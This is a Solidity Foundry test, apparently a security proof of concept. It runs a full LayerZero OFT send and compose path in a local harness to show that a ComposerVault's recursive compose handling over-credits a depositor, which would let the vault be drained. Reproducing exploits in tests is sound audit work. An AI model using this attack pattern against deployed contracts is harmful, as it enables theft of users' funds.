// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { MintableOFT } from "../src/MintableOFT.sol";
import { ComposerVault } from "../src/ComposerVault.sol";
import { SendParam, MessagingFee, OFTReceipt } from "@layerzerolabs/oapp-evm/contracts/oft/interfaces/IOFT.sol";
import { MessagingReceipt } from "@layerzerolabs/oapp-evm/contracts/oapp/OApp.sol";
import { OptionsBuilder } from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OptionsBuilder.sol";
import { OFTComposeMsgCodec } from "@layerzerolabs/oapp-evm/contracts/oft/libs/OFTComposeMsgCodec.sol";
import { ILayerZeroEndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { console2 } from "forge-std/console2.sol";
import { Vm } from "forge-std/Vm.sol";

contract RealFullPathComposeDrain is TestHelperOz5 {
    using OptionsBuilder for bytes;

    MintableOFT srcOft;
    MintableOFT dstOft;
    ComposerVault vault;
    uint32 aEid = 1;
    uint32 bEid = 2;
    address OWNER = address(0x1111);
    address HONEST_DEPOSITOR = address(0xBEEF);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(2, LibraryType.UltraLightNode);
        vm.deal(OWNER, 100 ether);
        vm.deal(HONEST_DEPOSITOR, 100 ether);

        srcOft = new MintableOFT("SrcOFT", "SOFT", address(endpoints[aEid]), OWNER);
        dstOft = new MintableOFT("DstOFT", "DOFT", address(endpoints[bEid]), OWNER);
        vault = new ComposerVault(address(endpoints[bEid]));

        vm.prank(OWNER);
        srcOft.setPeer(bEid, bytes32(uint256(uint160(address(dstOft)))));
        vm.prank(OWNER);
        dstOft.setPeer(aEid, bytes32(uint256(uint160(address(srcOft)))));

        vm.prank(OWNER);
        srcOft.testMint(HONEST_DEPOSITOR, 100 ether);
    }

    function test_ATTACK_FullPathRealOFTSendTriggersComposeRecursion() public {
        console2.log("=== FULL REAL PATH: OFT.send() -> real DVN attest -> real commit -> real _lzReceive -> real protocol-invoked sendCompose ===");

        uint256 realTransferAmount = 5 ether;
        bytes memory composeMsg = abi.encodePacked(bytes32(uint256(uint160(address(vault)))));

        bytes memory options = OptionsBuilder.newOptions()
            .addExecutorLzReceiveOption(200000, 0)
            .addExecutorLzComposeOption(0, 300000, 0);

        SendParam memory sp = SendParam({
            dstEid: bEid,
            to: bytes32(uint256(uint160(address(vault)))), // vault itself is the OFT recipient AND composer
            amountLD: realTransferAmount,
            minAmountLD: 0,
            extraOptions: options,
            composeMsg: composeMsg,
            oftCmd: ""
        });

        vm.prank(HONEST_DEPOSITOR);
        MessagingFee memory fee = srcOft.quoteSend(sp, false);

        console2.log("HONEST_DEPOSITOR sending REAL, genuine cross-chain OFT transfer of:", realTransferAmount);
        vm.recordLogs();
        vm.prank(HONEST_DEPOSITOR);
        (MessagingReceipt memory receipt, ) = srcOft.send{value: fee.nativeFee}(sp, fee, HONEST_DEPOSITOR);

        console2.log("Running FULL real verify+deliver, which triggers the PROTOCOL's own internal sendCompose call (queues, does not execute)...");
        verifyPackets(bEid, address(dstOft));

        // Capture the REAL bytes the protocol actually queued, straight
        // from its own ComposeSent event - no manual reconstruction, no
        // guessing at field order. This IS exactly what commitQueue hashed.
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes memory realQueuedMessage;
        // ComposeSent has NO indexed params - ALL 5 fields are in `data`,
        // topics[0] is just the event selector (unindexed events still
        // get a topics[0] hash of the signature).
        bytes32 composeSentTopic = keccak256("ComposeSent(address,address,bytes32,uint16,bytes)");
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == composeSentTopic) {
                (, , , , realQueuedMessage) = abi.decode(logs[i].data, (address, address, bytes32, uint16, bytes));
            }
        }
        console2.log("Real queued compose message captured, length:", realQueuedMessage.length);

        console2.log("Compose QUEUED by the real protocol. Now firing the explicit execution step (same as any real executor would)...");

        vm.prank(HONEST_DEPOSITOR);
        ILayerZeroEndpointV2(address(endpoints[bEid])).lzCompose(address(dstOft), address(vault), receipt.guid, 0, realQueuedMessage, bytes(""));

        console2.log("=== GROUND TRUTH ===");
        console2.log("Real OFT token balance credited to vault (the actual transfer):", dstOft.balanceOf(address(vault)));
        console2.log("Recursion levels the composer self-triggered:", vault.recursionCount());
        console2.log("Vault's internal credit ledger for HONEST_DEPOSITOR:", vault.vaultCredit(HONEST_DEPOSITOR));
        console2.log("Expected if SAFE (matches real transfer):", realTransferAmount);

        if (vault.vaultCredit(HONEST_DEPOSITOR) > realTransferAmount) {
            console2.log("!!!!! CONFIRMED END-TO-END: a fully genuine, protocol-triggered OFT compose still over-credits via recursion !!!!!");
            console2.log("!!!!! This closes every gap - real send, real DVN, real commit, real protocol-invoked sendCompose, still exploitable !!!!!");
        } else {
            console2.log("NOT REPRODUCED end-to-end - something about the real protocol path prevents this that our hand-crafted version missed.");
        }
    }
}
